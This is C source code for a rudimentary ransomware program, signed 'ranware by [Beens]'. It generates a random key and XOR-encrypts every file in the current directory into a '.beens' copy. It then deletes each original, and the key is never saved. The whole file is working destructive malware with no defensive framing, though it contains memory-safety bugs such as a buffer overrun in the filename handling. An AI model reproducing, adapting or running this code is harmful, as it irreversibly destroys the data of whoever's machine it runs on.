#include <dirent.h>
#include <elf.h>
#include <errno.h>
#include <fcntl.h>
#include <libgen.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>

/* Define the new extension for ransomed files */
#define RANSOMED_EXT ".beens"
#define CHARSET "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
#define KEY_LEN 32

/* This message is never displayed */
const char *never_displayed = "ranware by [Beens]";

/* Generate a random string for the encryption key */
void rand_str(char *dest, size_t size) {
    for (size_t n = 0; n < size; n++) {
        int key = rand() % (int)(sizeof CHARSET - 1);
        dest[n] = CHARSET[key];
    }
    dest[size] = '\0';
}

/* Perform XOR encryption for a single byte */
void encrypt_block(uint8_t *ret_char, uint8_t char_to_xor, int counter,
                   const uint8_t *key, size_t len_key) {
    uint8_t key_char = key[counter % len_key];
    *ret_char = char_to_xor ^ key_char;
}

/* Check if a filename is proper for encryption */
int is_filename_proper(const char *filename) {
    if (strcmp(".", filename) == 0 || strcmp("..", filename) == 0) {
        return 1;
    }
    if (strstr(filename, "ranmware") != 0 ||
        strstr(filename, ".beens") != 0) {
        return 1;
    }
    return 0;
}

/* Encrypt a file using XOR encryption and create a new file with extension */
void encrypt_file(const char *orig_filepath, const uint8_t *key,
                  size_t len_key) {
    char *bname;
    char *new_filepath;
    int origfile_fd, newfile_fd;
    struct stat st;
    int i;
    uint8_t *mem, *newmem;

    bname = basename((char *)orig_filepath);

    if (is_filename_proper(bname) != 0) {
        return;
    }

    if ((origfile_fd = open(orig_filepath, O_RDONLY)) < 0) {
        return;
    }

    if (fstat(origfile_fd, &st) < 0) {
        return;
    }

    new_filepath = strdup(orig_filepath);
    strcat(new_filepath, RANSOMED_EXT);

    if ((newfile_fd = open(new_filepath, O_WRONLY | O_CREAT | O_TRUNC)) < 0) {
        return;
    }

    fchmod(newfile_fd, st.st_mode);

    mem = (uint8_t *)mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, origfile_fd, 0);
    if (mem == MAP_FAILED) {
        return;
    }

    newmem = (uint8_t *)alloca(st.st_size);

    for (i = 0; i < st.st_size; i++) {
        encrypt_block(&newmem[i], mem[i], i, key, len_key);
    }

    if ((write(newfile_fd, newmem, st.st_size)) <= 0) {
        return;
    }

    remove(orig_filepath);

    close(newfile_fd);
    close(origfile_fd);
}

int main(int argc, char **argv) {
    DIR *d;
    struct dirent *dir;
    char *key;

    /* Generate and allocate memory for the encryption key */
    key = (char *) alloca(KEY_LEN * sizeof(char));
    rand_str(key, KEY_LEN);

    /* Open the current directory for processing */
    d = opendir(".");
    if (d) {
        /* Iterate through files and encrypt */
        while ((dir = readdir(d)) != NULL) {
            encrypt_file(dir->d_name, (const uint8_t *)key, KEY_LEN);
        }
        closedir(d);
    }
}
